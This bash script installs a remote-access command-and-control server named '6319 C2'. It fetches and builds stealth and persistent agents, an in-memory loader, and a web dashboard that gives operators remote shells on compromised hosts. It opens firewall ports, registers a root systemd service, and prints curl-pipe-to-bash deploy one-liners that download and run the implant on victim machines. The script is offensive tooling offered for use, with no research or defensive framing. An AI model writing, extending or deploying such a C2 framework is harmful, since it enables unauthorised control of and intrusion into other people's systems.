#!/bin/bash
set -e

C="\033[1;36m"
G="\033[1;32m"
Y="\033[1;33m"
R="\033[1;31m"
P="\033[1;35m"
N="\033[0m"

INSTALL_DIR="/opt/6319"
SERVICE_NAME="6319-c2"

echo -e "${P}"
cat << 'BANNER'
    ██████╗ ██████╗  ██╗ █████╗ 
   ██╔════╝╚════██╗███║██╔══██╗
   ██████╗  █████╔╝╚██║╚██████║
   ██╔═══╝ ╚═══██╗ ██║ ╚═══██║
   ╚██████╗██████╔╝ ██║ █████╔╝
    ╚═════╝╚═════╝  ╚═╝ ╚════╝ 
   C2 Server v3.2 - Installer
BANNER
echo -e "${N}"

info() { echo -e "${G}[+]${N} $1"; }
warn() { echo -e "${Y}[!]${N} $1"; }
err() { echo -e "${R}[-]${N} $1"; exit 1; }

[[ $EUID -ne 0 ]] && err "Run as root: sudo bash install.sh"

generate_path() {
    cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 26 | head -n 1
}

generate_key() {
    local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789;^.$[]{}?+-_'
    local key=""
    for i in {1..40}; do
        key+="${chars:RANDOM%${#chars}:1}"
    done
    echo "$key"
}

C2_WEB_PORT=$((5000 + RANDOM % 4000))
C2_SOCKET_PORT=$((C2_WEB_PORT + 1))
STEALTH_PATH=$(generate_path)
PERSIST_PATH=$(generate_path)
LOGIN_PATH=$(generate_path)
DASHBOARD_PATH=$(generate_path)
AUTH_KEY=$(generate_key)
SESSION_SECRET=$(openssl rand -hex 32 2>/dev/null || cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 64 | head -n 1)

info "Generated configuration:"
echo -e "  Web Port:     ${C}${C2_WEB_PORT}${N}"
echo -e "  Socket Port:  ${C}${C2_SOCKET_PORT}${N}"
echo ""

detect_os() {
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        OS=$ID
    elif [ -f /etc/redhat-release ]; then
        OS="rhel"
    elif [ -f /etc/debian_version ]; then
        OS="debian"
    else
        OS=$(uname -s | tr '[:upper:]' '[:lower:]')
    fi
    info "Detected OS: $OS"
}

install_deps_debian() {
    info "Installing dependencies (apt)..."
    apt-get update -qq
    apt-get install -y -qq python3 python3-pip python3-venv curl git wget >/dev/null 2>&1
}

install_deps_rhel() {
    info "Installing dependencies (yum/dnf)..."
    if command -v dnf &>/dev/null; then
        dnf install -y python3 python3-pip curl git wget >/dev/null 2>&1
    else
        yum install -y python3 python3-pip curl git wget >/dev/null 2>&1
    fi
}

install_deps_arch() {
    info "Installing dependencies (pacman)..."
    pacman -Sy --noconfirm python python-pip curl git wget >/dev/null 2>&1
}

install_deps_alpine() {
    info "Installing dependencies (apk)..."
    apk add --no-cache python3 py3-pip curl git wget >/dev/null 2>&1
}

install_go() {
    if command -v go &>/dev/null; then
        GO_VER=$(go version | awk '{print $3}')
        info "Go already installed: $GO_VER"
        return 0
    fi
    
    info "Installing Go..."
    GO_VERSION="1.21.5"
    ARCH=$(uname -m)
    case "$ARCH" in
        x86_64) GO_ARCH="amd64" ;;
        aarch64|arm64) GO_ARCH="arm64" ;;
        armv7l|armv6l) GO_ARCH="armv6l" ;;
        *) err "Unsupported architecture: $ARCH" ;;
    esac
    
    GO_TAR="go${GO_VERSION}.linux-${GO_ARCH}.tar.gz"
    GO_URL="https://go.dev/dl/${GO_TAR}"
    
    cd /tmp
    wget -q "$GO_URL" -O "$GO_TAR" || curl -fsSL "$GO_URL" -o "$GO_TAR"
    rm -rf /usr/local/go
    tar -C /usr/local -xzf "$GO_TAR"
    rm -f "$GO_TAR"
    
    export PATH="/usr/local/go/bin:$PATH"
    
    if ! grep -q '/usr/local/go/bin' /etc/profile; then
        echo 'export PATH="/usr/local/go/bin:$PATH"' >> /etc/profile
    fi
    
    info "Go installed: $(go version | awk '{print $3}')"
}

install_deps() {
    case "$OS" in
        ubuntu|debian|kali|mint|pop) install_deps_debian ;;
        rhel|centos|fedora|rocky|alma) install_deps_rhel ;;
        arch|manjaro|endeavouros) install_deps_arch ;;
        alpine) install_deps_alpine ;;
        *) 
            warn "Unknown OS: $OS, trying apt..."
            install_deps_debian || install_deps_rhel || err "Failed to install deps"
            ;;
    esac
}

setup_firewall() {
    info "Configuring firewall..."
    if command -v ufw &>/dev/null; then
        ufw allow ${C2_WEB_PORT}/tcp >/dev/null 2>&1 || true
        ufw allow ${C2_SOCKET_PORT}/tcp >/dev/null 2>&1 || true
        info "UFW: ports ${C2_WEB_PORT}, ${C2_SOCKET_PORT} opened"
    elif command -v firewall-cmd &>/dev/null; then
        firewall-cmd --permanent --add-port=${C2_WEB_PORT}/tcp >/dev/null 2>&1 || true
        firewall-cmd --permanent --add-port=${C2_SOCKET_PORT}/tcp >/dev/null 2>&1 || true
        firewall-cmd --reload >/dev/null 2>&1 || true
        info "firewalld: ports ${C2_WEB_PORT}, ${C2_SOCKET_PORT} opened"
    elif command -v iptables &>/dev/null; then
        iptables -I INPUT -p tcp --dport ${C2_WEB_PORT} -j ACCEPT 2>/dev/null || true
        iptables -I INPUT -p tcp --dport ${C2_SOCKET_PORT} -j ACCEPT 2>/dev/null || true
        info "iptables: ports ${C2_WEB_PORT}, ${C2_SOCKET_PORT} opened"
    fi
}

detect_os
install_deps
install_go

if systemctl is-active --quiet ${SERVICE_NAME} 2>/dev/null; then
    info "Stopping existing service..."
    systemctl stop ${SERVICE_NAME}
fi

info "Creating installation directory..."
rm -rf "$INSTALL_DIR"
mkdir -p "$INSTALL_DIR/templates" "$INSTALL_DIR/static"
cd "$INSTALL_DIR"

info "Creating Python virtual environment..."
python3 -m venv venv
source venv/bin/activate

info "Installing Python packages..."
pip install --upgrade pip -q
pip install flask flask-socketio pynacl gevent gevent-websocket requests -q

info "Creating source files..."

cat > crypto.py << 'CRYPTO_EOF'
import os
import secrets
import hashlib
import nacl.secret
import nacl.utils

def generate_secret():
    return secrets.token_hex(32)

def verify_secret(secret):
    return secret and len(secret) >= 32

class SecureChannel:
    def __init__(self, secret):
        key = hashlib.sha256(secret.encode()).digest()
        self.box = nacl.secret.SecretBox(key)
    
    def enc(self, data):
        import json
        plaintext = json.dumps(data).encode()
        nonce = nacl.utils.random(nacl.secret.SecretBox.NONCE_SIZE)
        ciphertext = self.box.encrypt(plaintext, nonce)
        return ciphertext
    
    def dec(self, data):
        import json
        plaintext = self.box.decrypt(data)
        return json.loads(plaintext.decode())
CRYPTO_EOF

cat > webhooks.py << 'WEBHOOKS_EOF'
import os
import requests
import threading

class WebhookNotifier:
    def __init__(self):
        self.telegram_token = os.environ.get('TELEGRAM_BOT_TOKEN')
        self.telegram_chat = os.environ.get('TELEGRAM_CHAT_ID')
        self.discord_url = os.environ.get('DISCORD_WEBHOOK_URL')
    
    def is_configured(self):
        return bool(self.telegram_token and self.telegram_chat) or bool(self.discord_url)
    
    def notify(self, message, event_type='info'):
        if self.telegram_token and self.telegram_chat:
            threading.Thread(target=self._send_telegram, args=(message,), daemon=True).start()
        if self.discord_url:
            threading.Thread(target=self._send_discord, args=(message, event_type), daemon=True).start()
    
    def _send_telegram(self, message):
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            requests.post(url, json={'chat_id': self.telegram_chat, 'text': message, 'parse_mode': 'HTML'}, timeout=10)
        except:
            pass
    
    def _send_discord(self, message, event_type):
        try:
            color = {'connect': 0x00ff00, 'disconnect': 0xff0000, 'beacon': 0x0099ff}.get(event_type, 0x808080)
            requests.post(self.discord_url, json={'embeds': [{'description': message, 'color': color}]}, timeout=10)
        except:
            pass
WEBHOOKS_EOF

info "Downloading source files from GitHub..."
GITHUB_RAW="https://raw.githubusercontent.com/44pie/6319/main"

curl -fsSL "${GITHUB_RAW}/server.py" -o server.py || err "Failed to download server.py"
curl -fsSL "${GITHUB_RAW}/agent_stealth.py" -o agent_stealth.py || warn "Could not download agent_stealth.py"
curl -fsSL "${GITHUB_RAW}/memfd_loader.py" -o memfd_loader.py || warn "Could not download memfd_loader.py"
curl -fsSL "${GITHUB_RAW}/crypto.py" -o crypto.py 2>/dev/null || true
curl -fsSL "${GITHUB_RAW}/webhooks.py" -o webhooks.py 2>/dev/null || true

info "Downloading Go agent sources..."
mkdir -p go/cmd/agent go/cmd/loader
curl -fsSL "${GITHUB_RAW}/go/go.mod" -o go/go.mod || err "Failed to download go.mod"
curl -fsSL "${GITHUB_RAW}/go/go.sum" -o go/go.sum 2>/dev/null || true
curl -fsSL "${GITHUB_RAW}/go/cmd/agent/main.go" -o go/cmd/agent/main.go || err "Failed to download agent source"
curl -fsSL "${GITHUB_RAW}/go/cmd/loader/main.go" -o go/cmd/loader/main.go || err "Failed to download loader source"

info "Building Go binaries..."
mkdir -p bin
cd go

export PATH="/usr/local/go/bin:$PATH"
export CGO_ENABLED=0

ARCH=$(uname -m)
case "$ARCH" in
    x86_64) GOARCH="amd64" ;;
    aarch64|arm64) GOARCH="arm64" ;;
    *) GOARCH="amd64" ;;
esac

go mod download 2>/dev/null || go mod tidy

info "Building agent for linux/${GOARCH}..."
GOOS=linux GOARCH=$GOARCH go build -ldflags="-s -w" -o ../bin/agent_linux_${GOARCH} ./cmd/agent/

info "Building loader for linux/${GOARCH}..."
GOOS=linux GOARCH=$GOARCH go build -ldflags="-s -w" -o ../bin/loader_linux_${GOARCH} ./cmd/loader/

cd ..

if [ -f "bin/agent_linux_${GOARCH}" ]; then
    info "Go binaries built successfully!"
    ls -la bin/
else
    err "Failed to build Go binaries"
fi

mkdir -p templates static

info "Downloading templates and static files..."
curl -fsSL "${GITHUB_RAW}/templates/index.html" -o templates/index.html || err "Failed to download index.html"
curl -fsSL "${GITHUB_RAW}/templates/login.html" -o templates/login.html || err "Failed to download login.html"
curl -fsSL "${GITHUB_RAW}/static/style.css" -o static/style.css || err "Failed to download style.css"

info "Source files downloaded successfully!"

: << 'EMBEDDED_TEMPLATES_DISABLED'
cat > templates/index.html << 'INDEX_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>6319 C2</title>
<link rel="stylesheet" href="/static/style.css">
<script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css">
</head>
<body>
<div class="container">
<header>
<pre class="ascii-art">
 ██████╗ ██████╗ ██╗ █████╗ 
██╔════╝ ╚════██╗███║██╔══██╗
███████╗  █████╔╝╚██║╚██████║
██╔═══██╗ ╚═══██╗ ██║ ╚═══██║
╚██████╔╝██████╔╝ ██║ █████╔╝
 ╚═════╝ ╚═════╝  ╚═╝ ╚════╝ 
</pre>
<div class="stats-panel">
<div class="stat online"><span class="value" id="stat-online">0</span><span class="label">ONLINE</span></div>
<div class="stat dead"><span class="value" id="stat-dead">0</span><span class="label">DEAD</span></div>
<div class="stat total"><span class="value" id="stat-total">0</span><span class="label">TOTAL</span></div>
</div>
</header>
<div class="info-bar">
<div class="info-item"><span class="info-label">Stealth:</span><code class="info-value" id="deploy-stealth"></code></div>
<div class="info-item"><span class="info-label">Persist:</span><code class="info-value" id="deploy-persist"></code></div>
</div>
<div class="main-grid">
<div class="clients-panel">
<div class="panel-header">HOSTS</div>
<div class="clients-list" id="clients"></div>
</div>
<div class="terminal-panel">
<div class="panel-header">
<span id="term-title">Terminal</span>
<div id="term-controls" style="display:none;margin-left:auto;">
<select id="channel-select" class="channel-select"></select>
<button class="ctrl-btn" onclick="openPty()">PTY</button>
<button class="ctrl-btn red" onclick="closePty()">Close</button>
</div>
</div>
<div id="terminal-container"></div>
</div>
</div>
</div>
<script>
let socket=io(),term,ptySessionId=null,ptyMode=false,selected=null,selectedHost=null,selectedChannel=null,selectedClient=null,hostsData=[];
const fitAddon=new (class{fit(){if(term){const d=document.getElementById('terminal-container');if(d){const cols=Math.floor(d.clientWidth/9);const rows=Math.floor(d.clientHeight/17);term.resize(cols,rows);if(ptyMode&&ptySessionId)socket.emit('pty_resize',{session_id:ptySessionId,cols,rows});}}}})();
socket.on('connect',()=>console.log('WebSocket connected'));
socket.on('pty_ready',d=>{if(term)term.focus();});
socket.on('pty_output',d=>{if(term&&d.session_id===ptySessionId)term.write(d.data);});
socket.on('pty_closed',d=>{if(d.session_id===ptySessionId){closePty();term.write('\r\n\x1b[1;31m[PTY Closed]\x1b[0m\r\n');}});
socket.on('error',d=>alert(d.message));
async function refresh(){
const[hosts,stats]=await Promise.all([fetch('/api/clients').then(r=>r.json()),fetch('/api/stats').then(r=>r.json())]);
hostsData=hosts;
document.getElementById('stat-online').textContent=stats.online;
document.getElementById('stat-dead').textContent=stats.dead||0;
document.getElementById('stat-total').textContent=stats.total;
document.getElementById('deploy-stealth').textContent=stats.deploy_stealth;
document.getElementById('deploy-persist').textContent=stats.deploy_persist;
const list=document.getElementById('clients');
list.innerHTML='';
hosts.forEach(h=>{
const el=document.createElement('div');
const statusClass=h.overall_online?'online':(h.overall_status==='beacon'?'beacon':(h.overall_status==='sleeping'?'sleeping':'dark'));
el.className=`client ${statusClass} ${selectedHost===h.host_key?'selected':''}`;
el.onclick=(e)=>selectHost(h,e);
const channelBadges=h.channel_list.map(ch=>{
const chData=h.channels[ch];
let chStatus='offline';
if(chData.online)chStatus='online';
else if(chData.status==='beacon')chStatus='beacon';
return `<span class="channel-pill ${ch} ${chStatus}">${ch.toUpperCase()}</span>`;
}).join('');
el.innerHTML=`
<div class="client-row">
<span class="status-dot ${statusClass}"></span>
<span class="hostname">${h.hostname}</span>
<div class="channel-pills">${channelBadges}</div>
</div>
<div class="client-details">
<div><span class="lbl">IP:</span> ${h.ip}</div>
<div><span class="lbl">OS:</span> ${h.os}</div>
<div><span class="lbl">User:</span> ${h.user}</div>
<div><span class="lbl">Last seen:</span> ${h.last_seen_ago}</div>
</div>`;
list.appendChild(el);
});
}
function selectHost(h,e){
if(ptyMode)closePty();
selectedHost=h.host_key;
const channelSelect=document.getElementById('channel-select');
channelSelect.innerHTML='';
h.channel_list.forEach(ch=>{
const opt=document.createElement('option');
opt.value=ch;
const chData=h.channels[ch];
opt.textContent=`${ch.toUpperCase()} (${chData.online?'ONLINE':chData.status.toUpperCase()})`;
channelSelect.appendChild(opt);
});
const defaultChannel=h.channel_list.find(ch=>h.channels[ch].online)||h.channel_list[0];
channelSelect.value=defaultChannel;
selectedChannel=defaultChannel;
const chData=h.channels[selectedChannel];
selected=chData.id;
selectedClient=chData;
document.getElementById('term-title').textContent=`${h.hostname}`;
document.getElementById('term-controls').style.display='flex';
document.querySelectorAll('.client').forEach(el=>el.classList.remove('selected'));
if(e&&e.currentTarget)e.currentTarget.classList.add('selected');
}
document.getElementById('channel-select').addEventListener('change',function(){
selectedChannel=this.value;
const host=hostsData.find(h=>h.host_key===selectedHost);
if(host&&host.channels[selectedChannel]){
selected=host.channels[selectedChannel].id;
selectedClient=host.channels[selectedChannel];
}
if(ptyMode)closePty();
});
function openPty(){
if(!selected||!selectedClient)return alert('Select a host first');
if(!selectedClient.online)return alert('Host is offline');
if(ptyMode)closePty();
ptySessionId=Math.random().toString(36).substr(2,9);
ptyMode=true;
const container=document.getElementById('terminal-container');
container.innerHTML='';
term=new Terminal({cursorBlink:true,fontSize:14,fontFamily:"'JetBrains Mono',monospace",theme:{background:'#2e3440',foreground:'#eceff4',cursor:'#88c0d0',selection:'rgba(136,192,208,0.3)'}});
term.open(container);
term.onData(data=>socket.emit('pty_input',{session_id:ptySessionId,data}));
fitAddon.fit();
socket.emit('pty_spawn',{client_id:selected,session_id:ptySessionId,cols:term.cols,rows:term.rows});
}
function closePty(){
if(ptySessionId)socket.emit('pty_close',{session_id:ptySessionId});
ptySessionId=null;
ptyMode=false;
}
window.addEventListener('resize',()=>fitAddon.fit());
refresh();
setInterval(refresh,5000);
</script>
</body>
</html>
INDEX_EOF

cat > templates/login.html << 'LOGIN_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>6319 - Login</title>
<link rel="stylesheet" href="/static/style.css">
<style>
.login-container{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:var(--bg0);}
.login-logo{font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.1;color:var(--accent);margin-bottom:32px;text-align:center;white-space:pre;}
.login-card{background:var(--bg1);border-radius:8px;padding:32px;width:100%;max-width:400px;border:1px solid var(--bg2);}
.login-title{color:var(--fg);font-size:14px;text-align:center;margin-bottom:24px;letter-spacing:2px;}
.login-input{width:100%;padding:12px 16px;background:var(--bg0);border:1px solid var(--bg3);border-radius:4px;color:var(--fg);font-family:'JetBrains Mono',monospace;font-size:14px;margin-bottom:16px;box-sizing:border-box;}
.login-input:focus{outline:none;border-color:var(--accent);}
.login-input::placeholder{color:var(--fg3);}
.login-btn{width:100%;padding:12px;background:var(--accent);border:none;border-radius:4px;color:var(--bg0);font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:bold;letter-spacing:1px;cursor:pointer;transition:background 0.2s;}
.login-btn:hover{background:var(--accent2);}
.login-error{background:rgba(191,97,106,0.2);border:1px solid var(--red);color:var(--red);padding:10px 14px;border-radius:4px;font-size:12px;margin-bottom:16px;text-align:center;}
</style>
</head>
<body>
<div class="login-container">
<pre class="login-logo">
 ██████╗ ██████╗ ██╗ █████╗ 
██╔════╝ ╚════██╗███║██╔══██╗
███████╗  █████╔╝╚██║╚██████║
██╔═══██╗ ╚═══██╗ ██║ ╚═══██║
╚██████╔╝██████╔╝ ██║ █████╔╝
 ╚═════╝ ╚═════╝  ╚═╝ ╚════╝ 
</pre>
<div class="login-card">
<div class="login-title">ACCESS KEY REQUIRED</div>
{% if error %}<div class="login-error">{{ error }}</div>{% endif %}
<form method="POST" action="/login">
<input type="password" name="key" class="login-input" placeholder="Enter access key" autofocus required>
<button type="submit" class="login-btn">AUTHENTICATE</button>
</form>
</div>
</div>
</body>
</html>
LOGIN_EOF

cat > static/style.css << 'STYLE_EOF'
:root{--bg0:#2e3440;--bg1:#3b4252;--bg2:#434c5e;--bg3:#4c566a;--fg:#eceff4;--fg2:#d8dee9;--fg3:#a5b1c2;--accent:#88c0d0;--accent2:#81a1c1;--green:#a3be8c;--red:#bf616a;--yellow:#ebcb8b;--purple:#b48ead;--orange:#d08770;}
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'JetBrains Mono','Fira Code',monospace;background:var(--bg0);color:var(--fg);min-height:100vh;}
.container{max-width:1600px;margin:0 auto;padding:16px;}
header{display:flex;justify-content:space-between;align-items:center;padding-bottom:16px;border-bottom:1px solid var(--bg2);margin-bottom:16px;}
.ascii-art{font-size:9px;line-height:1.1;color:var(--accent);margin:0;}
.stats-panel{display:flex;gap:20px;}
.stat{text-align:center;}
.stat .value{display:block;font-size:24px;font-weight:bold;}
.stat.online .value{color:var(--green);}
.stat.dead .value{color:var(--red);}
.stat.total .value{color:var(--fg3);}
.stat .label{font-size:9px;color:var(--fg3);letter-spacing:1px;}
.info-bar{display:flex;gap:24px;padding:8px 16px;background:var(--bg1);border-radius:6px;margin-bottom:12px;align-items:center;flex-wrap:wrap;}
.info-item{font-size:11px;}
.info-label{color:var(--fg3);margin-right:6px;}
.info-value{color:var(--green);}
.channel-pills{position:absolute;top:10px;right:12px;display:flex;flex-direction:column;gap:3px;align-items:flex-end;}
.channel-pill{font-size:8px;padding:2px 6px;border-radius:3px;letter-spacing:0.5px;font-weight:bold;}
.channel-pill.stealth{background:transparent;border:1px solid var(--purple);color:var(--purple);}
.channel-pill.stealth.online{background:var(--purple);color:var(--bg0);}
.channel-pill.persist{background:transparent;border:1px solid var(--orange);color:var(--orange);}
.channel-pill.persist.online{background:var(--orange);color:var(--bg0);}
.channel-pill.offline{opacity:0.5;}
.channel-select{background:var(--bg2);border:1px solid var(--bg3);color:var(--fg);font-family:inherit;font-size:11px;padding:4px 8px;border-radius:4px;cursor:pointer;margin-right:8px;}
.channel-select:focus{outline:none;border-color:var(--accent);}
.main-grid{display:grid;grid-template-columns:300px 1fr;gap:16px;height:calc(100vh - 180px);}
.clients-panel,.terminal-panel{background:var(--bg1);border-radius:8px;overflow:hidden;display:flex;flex-direction:column;}
.panel-header{padding:10px 16px;background:var(--bg2);font-size:11px;letter-spacing:1px;color:var(--fg3);display:flex;align-items:center;}
.clients-list{flex:1;overflow-y:auto;padding:8px;}
.client{background:var(--bg2);border-radius:5px;padding:10px 12px;margin-bottom:8px;cursor:pointer;border:2px solid transparent;transition:all 0.15s;position:relative;}
.client:hover{border-color:var(--bg3);}
.client.selected{border-color:var(--accent);background:var(--bg3);}
.client.online{border-left:3px solid var(--green);}
.client.beacon{border-left:3px solid var(--accent);}
.client.sleeping{border-left:3px solid var(--yellow);opacity:0.7;}
.client.dark{border-left:3px solid var(--bg3);opacity:0.5;}
.client-row{display:flex;align-items:center;gap:8px;margin-bottom:6px;}
.hostname{flex:1;font-weight:bold;color:var(--fg);}
.status-dot{width:10px;height:10px;min-width:10px;min-height:10px;border-radius:50%;flex-shrink:0;display:inline-block;}
.status-dot.online{background:var(--green);box-shadow:0 0 6px var(--green);animation:pulse 2s infinite;}
.status-dot.beacon{background:var(--accent);}
.status-dot.sleeping{background:var(--yellow);}
.status-dot.dark{background:var(--bg3);}
@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.5;}}
.client-details{font-size:11px;color:var(--fg2);line-height:1.5;}
.client-details .lbl{color:var(--fg3);}
.terminal-panel{display:flex;flex-direction:column;}
#terminal-container{flex:1;padding:8px;background:var(--bg0);}
.ctrl-btn{background:var(--bg2);border:1px solid var(--bg3);color:var(--fg);padding:4px 10px;border-radius:4px;cursor:pointer;font-size:10px;margin-left:4px;}
.ctrl-btn:hover{background:var(--bg3);}
.ctrl-btn.red{border-color:var(--red);color:var(--red);}
.ctrl-btn.red:hover{background:var(--red);color:var(--bg0);}
STYLE_EOF
EMBEDDED_TEMPLATES_DISABLED

info "Writing environment configuration..."
cat > .env << EOF
C2_WEB_PORT=${C2_WEB_PORT}
C2_SOCKET_PORT=${C2_SOCKET_PORT}
STEALTH_PATH=${STEALTH_PATH}
PERSIST_PATH=${PERSIST_PATH}
LOGIN_PATH=${LOGIN_PATH}
DASHBOARD_PATH=${DASHBOARD_PATH}
AUTH_KEY=${AUTH_KEY}
SESSION_SECRET=${SESSION_SECRET}
EOF
chmod 600 .env

setup_firewall

info "Creating systemd service..."
cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=6319 C2 Server v3.2
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=${INSTALL_DIR}
EnvironmentFile=${INSTALL_DIR}/.env
Environment="PATH=${INSTALL_DIR}/venv/bin:/usr/local/bin:/usr/bin:/bin"
ExecStart=${INSTALL_DIR}/venv/bin/python ${INSTALL_DIR}/server.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

info "Enabling and starting service..."
systemctl daemon-reload
systemctl enable ${SERVICE_NAME}
systemctl start ${SERVICE_NAME}

sleep 2

SERVER_IP=$(hostname -I | awk '{print $1}')

if systemctl is-active --quiet ${SERVICE_NAME}; then
    echo ""
    echo -e "${G}========================================${N}"
    echo -e "${G}   6319 C2 Server v3.2 INSTALLED!${N}"
    echo -e "${G}========================================${N}"
    echo ""
    echo -e "${P}[ACCESS - SAVE THIS!]${N}"
    echo -e "  Login:     ${C}http://${SERVER_IP}:${C2_WEB_PORT}/${LOGIN_PATH}${N}"
    echo -e "  Dashboard: ${C}http://${SERVER_IP}:${C2_WEB_PORT}/${DASHBOARD_PATH}${N}"
    echo -e "  Key:       ${Y}${AUTH_KEY}${N}"
    echo -e "  Cookie:    ${C}24 hours${N}"
    echo ""
    echo -e "${G}[DEPLOY COMMANDS]${N}"
    echo ""
    echo -e "${Y}Stealth (in-memory):${N}"
    echo -e "  bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${STEALTH_PATH})\""
    echo ""
    echo -e "${Y}Persist (survives reboot):${N}"
    echo -e "  bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${PERSIST_PATH})\""
    echo ""
    echo -e "Agents: ${C}port ${C2_SOCKET_PORT} (encrypted)${N}"
    echo -e "Service: ${C}systemctl status ${SERVICE_NAME}${N}"
    echo -e "Logs: ${C}journalctl -u ${SERVICE_NAME} -f${N}"
    echo ""
else
    err "Service failed to start. Check: journalctl -u ${SERVICE_NAME} -n 50"
fi
